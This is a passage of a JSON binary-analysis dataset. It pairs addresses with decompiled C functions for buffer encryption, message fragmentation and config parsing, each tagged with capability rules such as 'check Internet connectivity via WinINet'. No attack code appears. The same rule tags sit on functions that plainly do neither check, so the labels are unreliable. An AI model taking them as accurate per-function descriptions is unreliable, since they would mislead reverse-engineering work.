            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006ed70(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_b4h;\n    uint8_t *var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    char *var_8h;\n    int32_t var_4h;\n    \n    var_b4h = fcn.0006f020(arg_8h);\n    if (var_b4h == 0) {\n        if (arg_10h < 1) {\n            var_8h = NULL;\n            var_4h = 0;\n        }\n        else {\n            puVar1 = *(arg_8h + 0x1c);\n            var_ach = *puVar1;\n            var_a8h = puVar1[1];\n            var_98h = puVar1[2];\n            var_94h = puVar1[3];\n            var_a0h = var_ach;\n            var_9ch = var_a8h;\n            fcn.00031300(&var_90h, 0x10, &var_a0h);\n            var_8h = fcn.00035200(arg_10h + 9);\n            if (var_8h == NULL) {\n                return 0x21590004;\n            }\n            fcn.000307e0(arg_ch, var_8h + 1, arg_10h, &var_90h, &var_ach, 1);\n            uVar3 = arg_10h & 0x80000007;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n            }\n            var_4h = (-(uVar3 != 0) & 8) + (arg_10h + (arg_10h >> 0x1f & 7U) >> 3) * 8;\n            *var_8h = var_4h - arg_10h;\n            var_4h = var_4h + 1;\n        }\n        var_b4h = fcn.00076500(*(arg_8h + 4), var_8h, var_4h, &var_b0h, &var_a4h, arg_1ch, arg_20h);\n        fcn.00035330(var_8h);\n        if (var_b4h == 0) {\n            if (var_a4h == 0) {\n                *arg_14h = 0;\n                *arg_18h = 0;\n                var_b4h = 0;\n            }\n            else if (var_a4h < 9) {\n                var_b4h = 0x2159012d;\n            }\n            else {\n                puVar1 = *(arg_8h + 0x1c);\n                var_ach = *puVar1;\n                var_a8h = puVar1[1];\n                var_98h = puVar1[2];\n                var_94h = puVar1[3];\n                var_a0h = var_ach;\n                var_9ch = var_a8h;\n                fcn.00031300(&var_90h, 0x10, &var_a0h);\n                iVar2 = fcn.00035200(var_a4h);\n                *arg_14h = iVar2;\n                if (*arg_14h == 0) {\n                    var_b4h = 0x21590004;\n                }\n                else {\n                    fcn.000307e0(var_b0h + 1, *arg_14h, var_a4h + -1, &var_90h, &var_ach, 0);\n                    *arg_18h = (var_a4h + -1) - *var_b0h;\n                }\n                fcn.00076610(*(arg_8h + 4), var_b0h);\n            }\n        }\n    }\n    return var_b4h;\n}\n",
        "token_count": 989
    },
    "0006f020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006f020(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (*(arg_8h + 0x24) == 1) {\n        var_4h = 0;\n    }\n    else {\n        fcn.00034550(arg_8h + 0x28);\n        if (*(arg_8h + 0x24) == 0) {\n            *(arg_8h + 0x1c) = arg_8h + 0xc;\n            *(arg_8h + 0x20) = 0x10;\n            *(arg_8h + 0x24) = 1;\n            var_4h = 0;\n        }\n        else if (*(arg_8h + 0x24) == 1) {\n            var_4h = 0;\n        }\n        else {\n            var_4h = 0x2159012d;\n        }\n        fcn.000345c0(arg_8h + 0x28);\n    }\n    return var_4h;\n}\n",
        "token_count": 240
    },
    "0006f0a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006f0a0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 1) {\n        if (arg_14h == 0x10) {\n            fcn.0007877e(arg_8h + 0x30, arg_10h, 0x10);\n            var_8h = 0;\n        }\n        else {\n            var_8h = 0x21590064;\n        }\n    }\n    else {\n        var_8h = 0;\n    }\n    iVar1 = fcn.000766a0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (var_8h != 0) {\n        iVar1 = var_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 238
    },
    "0006f120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006f120(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0006f020(arg_8h);\n    if ((iVar1 == 0) && (iVar1 = fcn.0006f190(arg_8h, arg_ch, &var_8h, &var_4h),  iVar1 == 0)) {\n        iVar1 = fcn.00076330(*(arg_8h + 4), var_8h, var_4h, arg_10h);\n        fcn.00035330(var_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 178
    },
    "0006f190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006f190(int32_t arg_8h, uint *arg_ch, char **arg_10h, int32_t *arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b4h;\n    uint *var_b0h;\n    uint32_t var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    char *var_8h;\n    int32_t var_4h;\n    \n    var_a8h = 0;\n    for (var_b0h = arg_ch; var_b0h != NULL; var_b0h = *var_b0h) {\n        var_a8h = var_a8h + var_b0h[2];\n    }\n    if (var_a8h == 0) {\n        *arg_10h = NULL;\n        *arg_14h = 0;\n        uVar2 = 0;\n    }\n    else {\n        puVar1 = *(arg_8h + 0x1c);\n        var_b8h = *puVar1;\n        var_b4h = puVar1[1];\n        var_98h = puVar1[2];\n        var_94h = puVar1[3];\n        var_a0h = var_b8h;\n        var_9ch = var_b4h;\n        fcn.00031300(&var_90h, 0x10, &var_a0h);\n        var_8h = fcn.00035200(var_a8h + 9);\n        if (var_8h == NULL) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            var_4h = 1;\n            var_ach = 0;\n            var_b0h = arg_ch;\n            var_a4h = 0;\n            while (var_b0h != NULL) {\n                if (8 - var_ach < var_b0h[2] - var_a4h) {\n                    fcn.0007877e(&var_c0h + var_ach, var_b0h[1] + var_a4h, 8 - var_ach);\n                    var_a4h = (8 - var_ach) + var_a4h;\n                    var_ach = 8;\n                }\n                else {\n                    fcn.0007877e(&var_c0h + var_ach, var_b0h[1] + var_a4h, var_b0h[2] - var_a4h);\n                    var_ach = (var_b0h[2] - var_a4h) + var_ach;\n                    var_b0h = *var_b0h;\n                    var_a4h = 0;\n                }\n                if ((var_ach == 8) || (var_b0h == NULL)) {\n                    fcn.000307e0(&var_c0h, var_8h + var_4h, var_ach, &var_90h, &var_b8h, 1);\n                    while( true ) {\n                        uVar3 = var_ach & 0x80000007;\n                        if (uVar3 < 0) {\n                            uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n                        }\n                        if (uVar3 == 0) break;\n                        var_ach = var_ach + 1;\n                    }\n                    var_4h = var_4h + var_ach;\n                    var_ach = 0;\n                }\n            }\n            *var_8h = (var_4h + -1) - var_a8h;\n            *arg_10h = var_8h;\n            *arg_14h = var_4h;\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 900
    },
    "0006f440": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006f440(int32_t arg_8h, uint arg_ch, int32_t *arg_10h, int32_t *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t var_b4h;\n    uint8_t *var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_b4h = fcn.0006f020(arg_8h);\n    if ((var_b4h == 0) && (var_b4h = fcn.0006f190(arg_8h, arg_ch, &var_8h, &var_4h),  var_b4h == 0)) {\n        var_b4h = fcn.00076500(*(arg_8h + 4), var_8h, var_4h, &var_b0h, &var_a4h, arg_18h, arg_1ch);\n        fcn.00035330(var_8h);\n        if (var_b4h == 0) {\n            if (var_a4h == 0) {\n                *arg_10h = 0;\n                *arg_14h = 0;\n                var_b4h = 0;\n            }\n            else if (var_a4h < 9) {\n                var_b4h = 0x2159012d;\n            }\n            else {\n                puVar1 = *(arg_8h + 0x1c);\n                var_ach = *puVar1;\n                var_a8h = puVar1[1];\n                var_98h = puVar1[2];\n                var_94h = puVar1[3];\n                var_a0h = var_ach;\n                var_9ch = var_a8h;\n                fcn.00031300(&var_90h, 0x10, &var_a0h);\n                iVar2 = fcn.00035200(var_a4h);\n                *arg_10h = iVar2;\n                if (*arg_10h == 0) {\n                    var_b4h = 0x21590004;\n                }\n                else {\n                    fcn.000307e0(var_b0h + 1, *arg_10h, var_a4h + -1, &var_90h, &var_ach, 0);\n                    *arg_14h = (var_a4h + -1) - *var_b0h;\n                }\n                fcn.00076610(*(arg_8h + 4), var_b0h);\n            }\n        }\n    }\n    return var_b4h;\n}\n",
        "token_count": 653
    },
    "0006f610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006f610(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00035200(0x38);\n    if (var_4h == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078790(var_4h, 0, 0x38);\n        var_ch = arg_ch;\n        var_8h = 0;\n        iVar1 = fcn.00075a40(var_4h + 4, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (iVar1 == 0) {\n            *(var_4h + 0x10) = 0;\n            *(var_4h + 0xc) = 0x1000000;\n            fcn.000344f0(var_4h + 0x2c);\n            fcn.000344f0(var_4h + 0x30);\n            *arg_8h = var_4h;\n        }\n        else {\n            fcn.00035330(var_4h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 343
    },
    "0006f6f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006f6f0(int32_t arg_8h)\n\n{\n    uint *var_4h;\n    \n    fcn.00034520(arg_8h + 0x2c);\n    fcn.00034520(arg_8h + 0x30);\n    for (var_4h = *(arg_8h + 0x34); var_4h != NULL; var_4h = *var_4h) {\n        fcn.00035330(var_4h[1]);\n    }\n    fcn.00070710(*(arg_8h + 0x34));\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 154
    },
    "0006f760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006f760(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.000760f0(*(arg_8h + 4), arg_ch);\n    if ((iVar1 == 0) && (*(arg_8h + 8) = 1,  *(arg_8h + 0x28) != 0)) {\n        var_4h._0_1_ = 1;\n        var_4h._1_2_ = fcn.000354c0(arg_8h & 0xffff0000 | *(arg_8h + 0x28));\n        var_18h = 0;\n        var_14h = 0;\n        var_8h = 0;\n        var_20h = 0xb1bdea78;\n        var_1ch = 3;\n        var_24h = &var_14h;\n        var_10h = &var_4h;\n        var_ch = 3;\n        iVar1 = fcn.00076840(*(arg_8h + 4), &var_24h, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 348
    },
    "0006f810": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006f810(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00075e70(*(arg_8h + 4), &var_8h, arg_10h);\n    if (iVar1 == 0) {\n        var_4h = fcn.00035200(0x38);\n        if (var_4h == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            fcn.00078790(var_4h, 0, 0x38);\n            *(var_4h + 4) = var_8h;\n            *(var_4h + 0xc) = *(arg_8h + 0xc);\n            *(var_4h + 0x10) = *(arg_8h + 0x10);\n            *(var_4h + 0x14) = *(arg_8h + 0x14);\n            *(var_4h + 0x18) = *(arg_8h + 0x18);\n            *(var_4h + 0x1c) = *(arg_8h + 0x1c);\n            *(var_4h + 0x20) = *(arg_8h + 0x20);\n            *(var_4h + 0x24) = *(arg_8h + 0x24);\n            fcn.000344f0(var_4h + 0x2c);\n            fcn.000344f0(var_4h + 0x30);\n            *(var_4h + 8) = 1;\n            *arg_ch = var_4h;\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 432
    },
    "0006f8f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006f8f0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    uint var_58h;\n    uint *var_54h;\n    uint8_t *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t **var_44h;\n    uint var_40h;\n    int32_t *var_3ch;\n    int32_t *var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t **var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_14h = NULL;\n    if (*(arg_8h + 8) == 0) {\n        var_30h = 0x21590003;\n    }\n    else {\n        if (*(arg_8h + 0x24) == 0) {\n            arg_ch = fcn.00070820(arg_ch, arg_10h);\n            var_8h = arg_ch;\n            if (arg_ch == 0) {\n                return 0x21590004;\n            }\n        }\n        else {\n            var_8h = 0;\n        }\n        var_30h = fcn.00070380(arg_8h, arg_ch, arg_10h, &var_14h, &var_18h);\n        if (var_30h == 0) {\n            if (var_18h < 0x7fff) {\n                if (var_18h < 0x10) {\n                    var_1ch = 1;\n                    iVar1 = fcn.000785f8();\n                    var_4h = iVar1 % 7 + 1;\n                    for (var_44h = var_14h; var_44h != NULL; var_44h = *var_44h) {\n                        var_44h[3] = var_4h;\n                        uVar2 = fcn.000785f8();\n                        uVar2 = uVar2 & 0x80000007;\n                        if (uVar2 < 0) {\n                            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n                        }\n                        var_4h = var_4h + uVar2 + 1;\n                    }\n                }\n                else if (var_18h < 0x7f) {\n                    var_1ch = 1;\n                    var_4h = 0x1;\n                    for (var_44h = var_14h; var_44h != NULL; var_44h = *var_44h) {\n                        var_44h[3] = var_4h;\n                        var_4h = var_4h + 1;\n                    }\n                }\n                else if (var_18h < 0x100) {\n                    var_1ch = 0;\n                    uVar2 = fcn.000785f8();\n                    uVar2 = uVar2 & 0x8000007f;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff80) + 1;\n                    }\n                    var_4h = uVar2 + 1;\n                    for (var_44h = var_14h; var_44h != NULL; var_44h = *var_44h) {\n                        var_44h[3] = var_4h;\n                        uVar2 = fcn.000785f8();\n                        uVar2 = uVar2 & 0x8000007f;\n                        if (uVar2 < 0) {\n                            uVar2 = (uVar2 - 1 | 0xffffff80) + 1;\n                        }\n                        var_4h = var_4h + uVar2 + 1;\n                    }\n                }\n                else {\n                    var_1ch = 0;\n                    var_4h = 0x1;\n                    for (var_44h = var_14h; var_44h != NULL; var_44h = *var_44h) {\n                        var_44h[3] = var_4h;\n                        var_4h = var_4h + 1;\n                    }\n                }\n                fcn.00070530(var_14h, var_18h);\n                var_54h = NULL;\n                var_50h = NULL;\n                var_4ch = 0;\n                var_48h = 0;\n                var_2ch = NULL;\n                var_28h = NULL;\n                var_24h = 0;\n                var_20h = 0;\n                var_40h = 0;\n                var_3ch = NULL;\n                var_38h = NULL;\n                var_34h = 0;\n                var_30h = 0;\n                fcn.00034550(arg_8h + 0x2c);\n                var_44h = var_14h;\n                var_10h = 0;\n                do {\n                    while( true ) {\n                        if (var_44h == NULL) goto code_r0x0006fcde;\n                        if (var_1ch == 0) {\n                            var_9h = 0xff;\n                            var_58h._0_2_ = *(var_44h + 3);\n                            ppiVar3 = var_44h;\n                            if (*var_44h == NULL) {\n                                ppiVar3 = var_58h | 0x8000;\n                                var_58h._0_2_ = ppiVar3;\n                            }\n                            var_50h = &var_9h;\n                            var_4ch = 1;\n                            var_54h = &var_2ch;\n                            var_58h._0_2_ = fcn.000354c0(ppiVar3 & 0xffff0000 | var_58h);\n                            var_28h = &var_58h;\n                            var_24h = 2;\n                            var_2ch = &var_40h;\n                            var_3ch = var_44h[1];\n                            var_38h = var_44h[2];\n                        }\n                        else {\n                            var_9h = *(var_44h + 3);\n                            if (*var_44h == NULL) {\n                                var_9h = var_9h | 0x80;\n                            }\n                            var_50h = &var_9h;\n                            var_4ch = 1;\n                            var_54h = &var_40h;\n                            var_3ch = var_44h[1];\n                            var_38h = var_44h[2];\n                        }\n                        if (*(arg_8h + 0xc) < var_44h[2]) {\n                            var_30h = 0x2159000b;\n                        }\n                        else {\n                            var_30h = fcn.00076840(*(arg_8h + 4), &var_54h, arg_14h);\n                            if ((var_30h != 0) && (var_30h != 0x2159000b)) {\n                                if (var_44h != var_14h) {\n                                    *(arg_8h + 8) = 0;\n                                }\n                                goto code_r0x0006fcde;\n                            }\n                        }\n                        if (var_30h == 0x2159000b) break;\n                        if (*(arg_8h + 0x10) < var_44h[2]) {\n                            *(arg_8h + 0x10) = var_44h[2];\n                        }\n                        var_44h = *var_44h;\n                        var_10h = var_10h + 1;\n                    }\n                    if (*(arg_8h + 0xc) == *(arg_8h + 0x10)) {\n                        *(arg_8h + 0x10) = 0;\n                    }\n                    else if (var_44h[2] < *(arg_8h + 0xc)) {\n                        *(arg_8h + 0xc) = var_44h[2];\n                    }\n                    var_30h = fcn.000705d0(arg_8h, var_44h);\n                } while (var_30h == 0);\n                if (var_44h != var_14h) {\n                    *(arg_8h + 8) = 0;\n                }\ncode_r0x0006fcde:\n                fcn.000345c0(arg_8h + 0x2c);\n                fcn.00070710(var_14h);\n                fcn.00035330(var_8h);\n            }\n            else {\n                fcn.00070710(var_14h);\n                var_30h = 0x2159000b;\n            }\n        }\n        else {\n            fcn.00035330(var_8h);\n        }\n    }\n    return var_30h;\n}\n",
        "token_count": 2086
    },
    "0006fd10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006fd10(int32_t arg_8h, int32_t *arg_ch, uint32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint *var_24h;\n    uint8_t *var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    var_20h = NULL;\n    if (*(arg_8h + 8) == 0) {\n        var_28h = 0x21590003;\n    }\n    else {\n        *arg_ch = 0;\n        fcn.00034550(arg_8h + 0x30);\n        var_8h = *(arg_8h + 0x34);\n        *(arg_8h + 0x34) = 0;\n        var_14h = 0;\n        while (var_28h = fcn.000763f0(*(arg_8h + 4), &var_20h, &var_ch, arg_14h, arg_18h),  var_28h == 0) {\n            if (var_ch == 0) {\n                *(arg_8h + 8) = 0;\n                var_28h = 0x2159000a;\n                goto code_r0x0006fffa;\n            }\n            var_18h = 0;\n            var_1h._0_1_ = *var_20h;\n            if (var_1h == 0xff) {\n                if (var_ch < 3) {\n                    *(arg_8h + 8) = 0;\n                    var_28h = 0x2159000a;\n                    goto code_r0x0006fffa;\n                }\n                uVar1 = fcn.000354c0(var_20h & 0xffff0000 | *(var_20h + 1));\n                var_18h = (uVar1 & 0x8000) != 0;\n                var_1ch = uVar1 & 0x7fff;\n                var_2ch = 3;\n                if (uVar1 != 0xffff) goto code_r0x0006feb9;\n                iVar3 = fcn.00070ba0(arg_8h, var_20h + 3, var_ch - 3);\n                if (iVar3 == 0) {\n                    var_28h = 0x2159000a;\n                    goto code_r0x0006fffa;\n                }\n                fcn.00076610(*(arg_8h + 4), var_20h);\n            }\n            else {\n                var_18h = (var_1h & 0x80) != 0;\n                var_1ch = var_1h & 0x7f;\n                var_2ch = 1;\ncode_r0x0006feb9:\n                if ((var_8h == NULL) || (var_8h[3] != var_1ch)) {\n                    var_10h = fcn.00035200(0x10);\n                    if (var_10h == NULL) {\n                        var_28h = 0x21590004;\n                        goto code_r0x0006fffa;\n                    }\n                    *var_10h = 0;\n                    var_10h[1] = 0;\n                    var_10h[2] = 0;\n                    var_10h[3] = 0;\n                    uVar2 = fcn.00035200(var_ch - var_2ch);\n                    var_10h[1] = uVar2;\n                    if (var_10h[1] == 0) {\n                        fcn.00035330(var_10h);\n                        var_28h = 0x21590004;\n                        goto code_r0x0006fffa;\n                    }\n                    var_10h[2] = var_ch - var_2ch;\n                    var_10h[3] = var_1ch;\n                    fcn.0007877e(var_10h[1], var_20h + var_2ch, var_ch - var_2ch);\n                    *var_10h = var_8h;\n                    var_8h = var_10h;\n                }\n                else {\n                    iVar3 = fcn.0001d7c0(var_8h + 1, var_8h[2], (var_ch - var_2ch) + var_8h[2]);\n                    if (iVar3 != 0) {\n                        var_28h = 0x21590004;\n                        goto code_r0x0006fffa;\n                    }\n                    fcn.0007877e(var_8h[1] + var_8h[2], var_20h + var_2ch, var_ch - var_2ch);\n                    var_8h[2] = (var_ch - var_2ch) + var_8h[2];\n                }\n                if (var_18h != 0) goto code_r0x0006fffa;\n                fcn.00076610(*(arg_8h + 4), var_20h);\n                var_20h = NULL;\n            }\n            var_14h = var_14h + 1;\n        }\n        if (var_28h == 0x21590002) {\n            *(arg_8h + 0x34) = var_8h;\n            var_8h = NULL;\n        }\ncode_r0x0006fffa:\n        fcn.000345c0(arg_8h + 0x30);\n        fcn.00076610(*(arg_8h + 4), var_20h);\n        if (var_28h == 0) {\n            fcn.00070740(var_8h);\n            var_ch = 0;\n            for (var_24h = var_8h; var_24h != NULL; var_24h = *var_24h) {\n                var_ch = var_ch + var_24h[2];\n            }\n            iVar3 = fcn.00035200(var_ch);\n            *arg_ch = iVar3;\n            if (*arg_ch == 0) {\n                var_28h = 0x21590004;\n            }\n            else {\n                var_ch = 0;\n                for (var_24h = var_8h; var_24h != NULL; var_24h = *var_24h) {\n                    fcn.0007877e(*arg_ch + var_ch, var_24h[1], var_24h[2]);\n                    var_ch = var_ch + var_24h[2];\n                }\n                if ((*(arg_8h + 0x24) != 0) || (var_28h = fcn.000709c0(*arg_ch, var_ch),  var_28h == 0)) {\n                    *arg_10h = var_ch;\n                }\n            }\n        }\n        for (var_24h = var_8h; var_24h != NULL; var_24h = *var_24h) {\n            fcn.00035330(var_24h[1]);\n        }\n        fcn.00070710(var_8h);\n        if (var_28h != 0) {\n            fcn.00035330(*arg_ch);\n            *arg_ch = 0;\n            *arg_10h = 0;\n        }\n    }\n    return var_28h;\n}\n",
        "token_count": 1753
    },
    "00070150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00070150(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (arg_ch == 1) {\n        if (arg_14h == 0x10) {\n            fcn.0007877e(arg_8h + 0x14, arg_10h, 0x10);\n            var_8h = 0;\n        }\n        else {\n            var_8h = 0x21590064;\n        }\n    }\n    iVar1 = fcn.000766a0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (var_8h != 0) {\n        iVar1 = var_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 230
    },
    "000701d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000701d0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_94h;\n    uint var_90h;\n    char *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch;\ncode_r0x000701df:\n    do {\n        iVar1 = fcn.00077cd0(&var_8h, &var_90h, 0x80, &var_ch);\n        if (iVar1 == 0) {\n            var_94h = 0;\ncode_r0x000702dd:\n            if (var_94h == 0) {\n                var_94h = fcn.00076270(*(arg_8h + 4), arg_ch, arg_10h);\n            }\n            return var_94h;\n        }\n        iVar1 = fcn.0007861c(&var_90h, 0xb1be2908);\n        if (iVar1 == 0) {\n            var_4h = fcn.0007874e(var_ch);\n            if (var_4h < 1) {\n                var_94h = 0x21590066;\n                goto code_r0x000702dd;\n            }\n            *(arg_8h + 0x10) = var_4h;\n            *(arg_8h + 0xc) = var_4h;\n            goto code_r0x000701df;\n        }\n        iVar1 = fcn.0007861c(&var_90h, 0xb1be2914);\n        if ((iVar1 == 0) && ((*var_ch == '1' || (*var_ch == 'Y')))) {\n            *(arg_8h + 0x24) = 1;\n        }\n        else {\n            iVar1 = fcn.0007861c(&var_90h, 0xb1be2928);\n            if (iVar1 == 0) {\n                var_4h = fcn.0007874e(var_ch);\n                if (var_4h < 1) {\n                    var_94h = 0x21590066;\n                    goto code_r0x000702dd;\n                }\n                *(arg_8h + 0x28) = var_4h;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 576
    },
    "00070330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
